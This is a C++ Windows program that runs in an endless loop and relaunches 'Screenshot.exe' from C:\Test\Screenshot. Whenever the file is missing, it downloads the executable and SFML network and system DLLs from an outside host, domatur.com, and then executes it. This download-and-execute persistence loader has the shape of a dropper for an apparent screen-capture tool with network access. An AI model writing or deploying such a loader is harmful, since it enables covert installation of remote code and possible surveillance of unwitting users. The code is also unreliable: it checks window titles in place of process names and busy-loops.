#pragma comment(lib, "urlmon.lib")
#include <Windows.h>
#include <iostream>
#include <string>
#include <direct.h>
#include <tchar.h>

using namespace std;

bool isProcessRunning(wstring name)
{
	HWND hwnd;
	hwnd = FindWindow(NULL, name.c_str());
	if (hwnd != 0) {
		return true;
	}
	else {
		return false;
	}
}

bool FileExits(const std::string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

void Download()
{
	const char * downloadPath = "C:\\Test\\Screenshot";
	_mkdir(downloadPath);
	HRESULT hr = URLDownloadToFile(NULL, _T("http://domatur.com/Screenshot.exe"), _T("C:\\Test\\Screenshot\\Screenshot.exe"), 0, NULL);
	HRESULT hr2 = URLDownloadToFile(NULL, _T("http://domatur.com/openal32.dll"), _T("C:\\Test\\Screenshot\\openal32.dll"), 0, NULL);
	HRESULT hr3 = URLDownloadToFile(NULL, _T("http://domatur.com/sfml-network-d-2.dll"), _T("C:\\Test\\Screenshot\\sfml-network-d-2.dll"), 0, NULL);
	HRESULT hr4 = URLDownloadToFile(NULL, _T("http://domatur.com/sfml-system-d-2.dll"), _T("C:\\Test\\Screenshot\\sfml-system-d-2.dll"), 0, NULL);
}

int main()
{
	while (true)
	{
		if (!isProcessRunning(L"Screenshot.exe"))
		{
			if (FileExits("C:\\Test\\Screenshot\\Screenshot.exe"))
			{
				system("C:\\Test\\Screenshot\\Screenshot.exe");
			}
			else
			{
				Download();
			}
		}
	}
	return 0;
}